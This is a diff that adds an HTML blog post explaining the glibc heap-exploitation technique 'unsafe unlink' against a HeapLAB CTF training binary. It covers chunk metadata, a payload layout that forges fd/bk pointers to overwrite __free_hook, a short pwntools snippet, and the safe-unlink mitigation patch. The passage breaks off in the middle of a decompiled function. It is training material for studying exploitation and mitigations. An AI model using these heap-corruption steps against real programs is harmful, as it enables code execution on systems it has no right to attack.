@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Linux Heap Exploitation: Unsafe Unlink - Arzedlab 🪵</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="A focused explanation of the unsafe unlink vulnerability that demonstrates corrupting chunk metadata to achieve arbitrary memory writes. The article includes step-by-step exploit logic and notes on modern mitigations that neutralize the classic technique." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/unsafe-unlink-1483648c0bf48032a944dc2bc36b5207/">
+  <meta property="og:site_name" content="Arzedlab 🪵">
+  <meta property="og:title" content="Linux Heap Exploitation: Unsafe Unlink">
+  <meta property="og:description" content="A focused explanation of the unsafe unlink vulnerability that demonstrates corrupting chunk metadata to achieve arbitrary memory writes. The article includes step-by-step exploit logic and notes on modern mitigations that neutralize the classic technique.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-14T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-14T00:00:00+00:00">
+    <meta property="article:tag" content="Unsafe-Unlink">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Glibc">
+    <meta property="article:tag" content="Malloc">
+    <meta property="article:tag" content="Exploitation">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Linux Heap Exploitation: Unsafe Unlink">
+  <meta name="twitter:description" content="A focused explanation of the unsafe unlink vulnerability that demonstrates corrupting chunk metadata to achieve arbitrary memory writes. The article includes step-by-step exploit logic and notes on modern mitigations that neutralize the classic technique.">
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />
+
+	
+	
+
+	
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Arzedlab 🪵</a>
+	</div>
+	<nav>
+		
+		<a href="/">🏠 Home</a>
+		
+		<a href="/posts">🗂️ All posts</a>
+		
+		<a href="/about">💡 About Me</a>
+		
+		<a href="/papers">📑 Publications</a>
+		
+		<a href="/tags">🏷️ Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Linux Heap Exploitation: Unsafe Unlink</h1>
+			<div class="meta">Posted on Jan 14, 2025</div>
+		</div>
+		
+
+		
+		<div class="toc">
+		<strong>Table of contents:</strong>
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-is-the-issue-then">What is the issue then?</a></li>
+    <li><a href="#exploitation-stages">Exploitation stages</a></li>
+    <li><a href="#shellcode">Shellcode</a></li>
+  </ul>
+</nav>
+		</div>
+
+		<section class="body">
+			<h1 id="unsafe-unlink">Unsafe Unlink</h1>
+<h1 id="introduction">Introduction</h1>
+<p>The &ldquo;Unsafe Unlink&rdquo; technique is a heap exploitation attack that was once quite common. It involves manipulating the unlink macro in <code>malloc.c</code> to remove a chunk from a bin. This attack exploits the pointer manipulation done in the unlink macro, which can lead to arbitrary code execution or other malicious activities.</p>
+<p>When we free allocated unsorted bin, it will be freed from a doubly linked list.</p>
+<p>A doubly linked list is a type of data structure that consists of a sequence of elements, where each element (or node) contains three parts:</p>
+<ol>
+<li><strong>Data</strong>: The value or information stored in the node.</li>
+<li><strong>Next Pointer (fd)</strong>: A reference to the next node in the sequence.</li>
+<li><strong>Previous Pointer (bk)</strong>: A reference to the last node in the sequence.</li>
+</ol>
+<p>This structure allows traversal in both directions—forward and backward—making it more flexible than a singly linked list, which can only be traversed in one direction. Here&rsquo;s a simple visual representation:</p>
+<p><img src="image.png" alt="image.png"></p>
+<p>Each node is connected to its <strong>FORWARD <code>fd</code></strong> and <strong>BACKWARD <code>bk</code></strong>, enabling efficient insertion and deletion of nodes from both list ends.</p>
+<p>Unsortedbin structure:</p>
+<p><img src="image%201.png" alt="image.png"></p>
+<p>Three allocated memory chunks with size 0x88 looks like this:</p>
+<p><img src="image%202.png" alt="image.png"></p>
+<p>As you can see, the <code>0x91</code>, <code>0x90</code> is the <code>chunk_size</code>  <code>0x1</code> is the <code>prev_inuse</code> flag indicating that the previous chunk is in use.</p>
+<p>Let’s free the first chunk on index <code>0</code></p>
+<p><img src="image%203.png" alt="image.png"></p>
+<p>First, we notice that the first two quadwords ( <code>0x00007ffff7dd4b78	0x00007ffff7dd4b78</code> ) of its user data are repurposed as forward <code>fd</code> and backward <code>bk</code> pointers, which the <code>unsorted</code> command in pwndbg can check.</p>
+<p>The second thing you notice is the two <code>0x90</code>  quadwords at the address <code>0x55555555c090</code>; the first one indicates the <code>prev_size</code>  of the previously freed chunk which matches its size field; the second one indicates the address of the second chunk with index 1, which changes the <code>prev_inuse</code> flag to <code>0</code> because the previous chunk (with index 0) be freed.</p>
+<p>Unsortedbins can change shape, let’s move on and free one more chunk with index 1</p>
+<p><img src="image%204.png" alt="image.png"></p>
+<p>After two memory allocations were freed, we can see that at address <code>0x55555555c120</code>, the memory allocator has coalesced the freed blocks into one single allocation. This indicates that the memory management system has effectively merged adjacent free chunks, and it also proves <code>prev_size</code> <code>0x120</code>.</p>
+<p>I think we get the point about how unsortedbin works, and how unlinking aka freeing works.</p>
+<h2 id="what-is-the-issue-then">What is the issue then?</h2>
+<p>We have the CTF-style binary to demonstrate how this exploitation works. First, we run itself</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>~/unsafe_unlink &gt; ./unsafe_unlink                                            
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">===============
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span>|   HeapLAB   |  Unsafe Unlink
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">===============
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span>
+</span></span><span style="display:flex;"><span>puts() @ 0x7f3c3e4395a0
+</span></span><span style="display:flex;"><span>heap @ 0x558b60f0f000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1) malloc 0/2
+</span></span><span style="display:flex;"><span>2) edit
+</span></span><span style="display:flex;"><span>3) free
+</span></span><span style="display:flex;"><span>4) quit
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">&gt; 
+</span></span></span></code></pre></div><p>We can call <code>malloc</code> only twice, and only for small chunks—excluding fast sizes (120 &lt; bytes &lt;= 1000). When we invoke <code>malloc</code> two times, it will allocate two small chunks. And option two shows, that we can edit the data section of these chunks, we can manipulate their content strategically. The main issue is the overflowing data section of chunks.
+If we can edit means we can also overflow data to the next chunk also,if we overflow the first chunk, it fills the header section of the second chunk’s also.</p>
+<p>Before overflow:</p>
+<p><img src="image%205.png" alt="image.png"></p>
+<p>After overflow:</p>
+<p><img src="image%206.png" alt="image.png"></p>
+<p>By filling the first chunk with <code>'A'</code> we successfully overwrite <code>prev_size[1]</code>  field, and the <code>chunk_size[2]</code> field along with the <code>prev_inuse[2]</code>  flag.</p>
+<p>This is the right structure for unsortedbin with the below code:</p>
+<ul>
+<li>a = malloc(0x88); b = malloc(0x88); free(a);</li>
+</ul>
+<p><img src="image%207.png" alt="image.png"></p>
+<p>Our primary goal is to achieve an arbitrary write primitive. To do this, we can craft a fake chunk and carefully manipulate its metadata. Specifically, we write fake <code>fd</code> and <code>bk</code> pointers pointing to controlled addresses, along with a fake <code>prev_size</code> value in data section of chunk A. Additionally, we clear the <code>prev_inuse</code> flag of the next chunk, making the fake chunk appear as though it is part of a freed <code>unsortedbin</code>, even though it is not actually freed.</p>
+<p>When the subsequent chunk is freed, the <code>unlink</code> operation will process the metadata of our fake chunk as if it were valid. This allows us to overwrite arbitrary memory addresses with controlled values, effectively achieving an arbitrary write primitive.</p>
+<h2 id="exploitation-stages">Exploitation stages</h2>
+<ol>
+<li>Overflow and overwrite with fake metadata.</li>
+<li>Overwrite <code>__free_malloc</code> metadata with payload address; when we free the chunk, it triggers our payload.</li>
+<li>Place the shellcode and run.</li>
+</ol>
+<p>Constructing Payload</p>
+<ul>
+<li><strong>fake_fd</strong> = <code>__free_hook</code>  - 0x18 (we will write our bk address by <code>fake_fd</code> pointer to <code>__free_hook</code>, and 0x18 is the offset in the representation of unsortedbin chunk structure (0x18 offset = <code>prev_size + size + fake_fd</code>))</li>
+<li>fake_bk = <code>heap</code>  + 0x20 = <code>0x0000555555603020</code>  (it points to data section <code>'A'</code>);</li>
+<li>a = <code>malloc(0x88)</code>; b = <code>malloc(0x88)</code>; <code>edit(a, p64(fd) + p64(bk) + b'A' * 0x70 + p64(0x90) + p64(0x90))</code></li>
+</ul>
+<p>This the fake chunk representation in-memory structure</p>
+<p><img src="image%208.png" alt="image.png"></p>
+<p>We can observe our fake <code>fd</code> and <code>bk</code> pointers at the start of chunk A, alongside chunk B&rsquo;s cleared <code>prev_inuse</code> flag. Additionally, we have a valid <code>prev_size</code> field that <code>malloc</code> can interpret and use. When chunk B is freed, <code>malloc</code> will examine its <code>prev_inuse</code> flag, notice it is cleared, and attempt to consolidate chunk B with chunk A.</p>
+<p>During this process, <code>malloc</code> reads our fake <code>prev_size</code> field, subtracts it from chunk B&rsquo;s address, and calculates the start of chunk A. Believing chunk A to be valid, it proceeds to unlink it from the free list where it appears to be linked. At this point, <code>malloc</code> performs the <code>unlink</code> operation on our fake <code>fd</code> and <code>bk</code> pointers, enabling us to exploit the reflected write primitive.</p>
+<p>Specifically, <code>malloc</code> will follow the <code>fd</code> pointer to what it assumes is another chunk and overwrite that chunk&rsquo;s <code>bk</code> with our fake <code>bk</code>.</p>
+<p><img src="image%209.png" alt="image.png"></p>
+<p>[1] - offset <code>prev_size</code></p>
+<p>[2] - offset <code>chunk_size|prev_inuse</code></p>
+<p>[3] - offset <code>fd</code></p>
+<p>[4] - <code>__free_hook</code> address, which is overwritten to our fake <code>bk</code>, which points to heap chunk A’s data section.</p>
+<p>Similarly, it will follow the <code>bk</code> pointer to another presumed chunk and overwrite that chunk&rsquo;s <code>fd</code> with our fake <code>fd</code>. This sequence provides us with a powerful arbitrary write primitive, allowing us to control memory writes at specific addresses, a crucial step in heap exploitation.</p>
+<p><img src="image%2010.png" alt="image.png"></p>
+<p>[1] chunk A’s fake <code>fd</code>  pointer</p>
+<p>[2] chunk A’s fake <code>bk</code>  pointer</p>
+<p>[3]  after 16 offsets with <code>'0x41'</code> , estimated <code>fd</code> overwritten with fake <code>fd</code></p>
+<h2 id="shellcode">Shellcode</h2>
+<p>The Shellcode part is easy, the binary is not compiled with NX flags that’s why we can place the our shellcode in chunks A data section and run.</p>
+<hr>
+<h1 id="safe-unlink">Safe Unlink</h1>
+<p>Nowadays unlink attack exploitation is present even with some security patches:</p>
+<p>We know how unlink process works in unsafe unlink:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>FD = P-&gt;fd;
+</span></span><span style="display:flex;"><span>BK = P-&gt;bk;
+</span></span><span style="display:flex;"><span>FD-&gt;bk = BK;
+</span></span><span style="display:flex;"><span>BK-&gt;fd = FD;
+</span></span></code></pre></div><p>First, it identifies the victim&rsquo;s (victim is the unlinking chunk or <code>p</code> in the source code) f<strong>orward FD</strong> and b<strong>ackward</strong> <code>bk</code> pointers. Then, it goes to the forward-pointed chunk and replaces this chunk’s <code>bk</code> pointer with the victim’s pointer <code>bk</code>, and it goes to the back-pointed chunk and replaces this chunk’s <code>fd</code> pointer with the victim’s <code>fd</code> pointer. By this algorithm, the middle chunk, aka the unlinking chunk, will be skipped in the linked list and added to the freed chunk list.</p>
+<p><img src="image%2011.png" alt="image.png"></p>
+<p>This demonstrates how unsafe unlink works, let’s check how safe unlink works after added a few mitigations</p>
+<p><a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=206be503a824bc1742211162120d6c7a150e0d6c;hp=6e6c1053b1a82d8836772569230f97b0ea043fea;hb=3e030bd5f9fa57f79a509565b5de6a1c0360d953;hpb=51ea6fc094544328c08c367bc40a3b830b8fe7e8">Safe unlinking checks.</a> Published in GLIBC version: 2.3.4</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#f55">--- a/malloc/malloc.c
+</span></span></span><span style="display:flex;"><span><span style="color:#f55"></span><span style="color:#50fa7b;font-weight:bold">+++ b/malloc/malloc.c
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold"></span><span style="font-weight:bold">@@ -280,6 +280,9 @@ extern &#34;C&#34; {
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span> /* For uintptr_t.  */
+</span></span><span style="display:flex;"><span> #include &lt;stdint.h&gt;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+/* For va_arg, va_start, va_end.  */
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+#include &lt;stdarg.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold"></span> /*
+</span></span><span style="display:flex;"><span>   Debugging:
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">@@ -1498,6 +1501,7 @@ static size_t   mUSABLe(Void_t*);
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span> static void     mSTATs(void);
+</span></span><span style="display:flex;"><span> static int      mALLOPt(int, int);
+</span></span><span style="display:flex;"><span> static struct mallinfo mALLINFo(mstate);
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+static void malloc_printf_nc(int action, const char *template, ...);
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold"></span> 
+</span></span><span style="display:flex;"><span> static Void_t* internal_function mem2mem_check(Void_t *p, size_t sz);
+</span></span><span style="display:flex;"><span> static int internal_function top_check(void);
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">@@ -1966,6 +1970,9 @@ typedef struct malloc_chunk* mbinptr;
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span> #define unlink(P, BK, FD) {                                            \
+</span></span><span style="display:flex;"><span>   FD = P-&gt;fd;                                                          \
+</span></span><span style="display:flex;"><span>   BK = P-&gt;bk;                                                          \
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+  if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                \
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+    malloc_printf_nc (check_action,                                    \
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+                     &#34;corrupted double-linked list at %p!\n&#34;, P);     \
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold"></span>   FD-&gt;bk = BK;                                                         \
+</span></span><span style="display:flex;"><span>   BK-&gt;fd = FD;                                                         \
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">@@ -2327,6 +2334,15 @@ __malloc_ptr_t weak_variable (*__memalign_hook)
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span> void weak_variable (*__after_morecore_hook) __MALLOC_P ((void)) = NULL;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+/* ---------------- Error behavior ------------------------------------ */
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+#ifndef DEFAULT_CHECK_ACTION
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+#define DEFAULT_CHECK_ACTION 3
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+static int check_action = DEFAULT_CHECK_ACTION;
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold"></span> /* ------------------- Support for multiple arenas -------------------- */
+</span></span><span style="display:flex;"><span> #include &#34;arena.c&#34;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">@@ -4164,21 +4180,7 @@ _int_free(mstate av, Void_t* mem)
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span>        here by accident or by &#34;design&#34; from some intruder.  */
+</span></span><span style="display:flex;"><span>     if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0))
+</span></span><span style="display:flex;"><span>       {
+</span></span><span style="display:flex;"><span><span style="color:#f55">-       if (check_action &amp; 1)
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-         {
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-#ifdef _LIBC
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-           _IO_flockfile (stderr);
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-           int old_flags2 = ((_IO_FILE *) stderr)-&gt;_flags2;
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-           ((_IO_FILE *) stderr)-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-           fprintf (stderr, &#34;free(): invalid pointer %p!\n&#34;, mem);
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-#ifdef _LIBC
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-           ((_IO_FILE *) stderr)-&gt;_flags2 |= old_flags2;
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-           _IO_funlockfile (stderr);
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-         }
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-       if (check_action &amp; 2)
+</span></span></span><span style="display:flex;"><span><span style="color:#f55">-         abort ();
+</span></span></span><span style="display:flex;"><span><span style="color:#f55"></span><span style="color:#50fa7b;font-weight:bold">+       malloc_printf_nc (check_action, &#34;free(): invalid pointer %p!\n&#34;, mem);
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold"></span>        return;
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">@@ -5404,6 +5406,35 @@ int mALLOPt(param_number, value) int param_number; int value;
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span> */
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+/* Helper code.  */
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+static void
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+malloc_printf_nc(int action, const char *template, ...)
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+{
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+  if (action &amp; 1)
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+    {
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+#ifdef _LIBC
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      _IO_flockfile (stderr);
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      int old_flags2 = ((_IO_FILE *) stderr)-&gt;_flags2;
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      ((_IO_FILE *) stderr)-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      va_list ap;
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      va_start (ap, template);
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      vfprintf (stderr, template, ap);
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      va_end (ap);
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+#ifdef _LIBC
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      ((_IO_FILE *) stderr)-&gt;_flags2 |= old_flags2;
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+      _IO_funlockfile (stderr);
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+    }
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+  if (action &amp; 2)
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+    abort ();
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+}
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold">+
+</span></span></span><span style="display:flex;"><span><span style="color:#50fa7b;font-weight:bold"></span> #ifdef _LIBC
+</span></span><span style="display:flex;"><span> # include &lt;sys/param.h&gt;
+</span></span></code></pre></div><p>The main mitigation is <code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</code>; if the next chunk’s <code>bk</code>  pointer doesn’t point back to the victim chunk OR  the previous chunk’s <code>fd</code> pointer doesn&rsquo;t point to the victim chunk as next chunk, it fails and prints error <code>&quot;corrupted double-linked list at chunk!&quot;</code></p>
+<p><img src="image%2012.png" alt="image.png"></p>
+<p>It&rsquo;s best to observe these examples in action by analyzing the behavior directly with the task binary.</p>
+<h1 id="task">Task</h1>
+<p>Overview of the task we such heap overflow bug and library (<code>glibc 2.30 no-tcache</code>).</p>
+<p>There are 5 functions in binary <strong>malloc</strong>, <strong>edit</strong>, <strong>free</strong>, <strong>target</strong>, and <strong>quit</strong>. you can only place small chunks - excluding fast sizes (120 &lt; bytes &lt;= 1000).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>./safe_unlink                                                                              
+</span></span><span style="display:flex;"><span>	===============
+</span></span><span style="display:flex;"><span>	|   HeapLAB   |  Safe Unlink
+</span></span><span style="display:flex;"><span>	===============
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	puts() @ 0x7fd2cf5bbaf0
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	1) malloc 0/2
+</span></span><span style="display:flex;"><span>	2) edit
+</span></span><span style="display:flex;"><span>	3) free
+</span></span><span style="display:flex;"><span>	4) target
+</span></span><span style="display:flex;"><span>	5) quit
+</span></span><span style="display:flex;"><span>	&gt; 1
+</span></span><span style="display:flex;"><span>	size: 0x100000000
+</span></span><span style="display:flex;"><span>	small chunks only - excluding fast sizes (120 &lt; bytes &lt;= 1000)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	1) malloc 0/2
+</span></span><span style="display:flex;"><span>	2) edit
+</span></span><span style="display:flex;"><span>	3) free
+</span></span><span style="display:flex;"><span>	4) target
+</span></span><span style="display:flex;"><span>	5) quit
+</span></span><span style="display:flex;"><span>	&gt; 
+</span></span></code></pre></div><p>As you can see, we don’t have the leak address of the heap.  To place the shellcode like the previous unsafe unlink binary. Let’s check how mitigations work with example pointers.</p>
+<p>First, we will malloc two chunks with the same size <code>0x88</code>, edit the first chunk with data, and overflow till the next’s chunk header quadwords, overwriting the next chunk quadwords with forged <code>prev_size</code> and <code>fake_size</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># Request 2 small chunks.</span>
+</span></span><span style="display:flex;"><span>chunk_A <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x88</span>)
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x88</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Prepare fake chunk metadata.</span>
+</span></span><span style="display:flex;"><span>fd <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>__free_hook <span style="color:#6272a4">#</span>
+</span></span><span style="display:flex;"><span>bk <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system
+</span></span><span style="display:flex;"><span>prev_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x90</span>
+</span></span><span style="display:flex;"><span>fake_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x90</span>
+</span></span><span style="display:flex;"><span>edit(chunk_A, p64(fd) <span style="color:#ff79c6">+</span> p64(bk) <span style="color:#ff79c6">+</span> p8(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span> <span style="color:#ff79c6">+</span> p64(prev_size) <span style="color:#ff79c6">+</span> p64(fake_size))
+</span></span></code></pre></div><p><img src="image%2013.png" alt="image.png"></p>
+<ol>
+<li>We successfully added forged <code>fk</code> and <code>bk</code> pointers.</li>
+<li>Forged <code>prev_size</code>  in the unlinking process subtracts the 0x90 address to identify the header of the first chunk. The second <code>0x90</code> is the size of the next chunk with the <code>prev_inuse</code>  flag 0x0, which means the first chunk is already freed.</li>
+</ol>
+<p>Unlink (free) the second chunk:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#bd93f9">1</span>) malloc <span style="color:#bd93f9">2</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2</span>) edit
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3</span>) free
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4</span>) target
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5</span>) quit
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span> $ <span style="color:#bd93f9">3</span>
+</span></span><span style="display:flex;"><span>index: $ <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>corrupted double<span style="color:#ff79c6">-</span>linked <span style="color:#8be9fd;font-style:italic">list</span>
+</span></span><span style="display:flex;"><span>$  
+</span></span></code></pre></div><p>Our mitigation is triggered, and it sends <code>SIGABRT</code> signal.</p>
+<p><img src="image%2014.png" alt="image.png"></p>
+<p>Yes, we triggered the same mitigation that was explained above. It goes to the chunk with our forged pointer <code>fd</code> (<code>0x00007ffff7dd2e20</code>) and could not find any <code>bk</code>  pointer which will point back to our chunk</p>
+<p><img src="image%2015.png" alt="image.png"></p>
+<p>Of course, it goes to the previous chunk with our forged <code>bk</code> (<code>0x00007ffff7a5f200</code>) pointer, and can not find a pointer <code>fd</code> that points to our chunk.</p>
+<p><img src="image%2016.png" alt="image.png"></p>
+<p>Let’s reverse the binary: what interesting things are there?!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
+</span></span><span style="display:flex;"><span>{
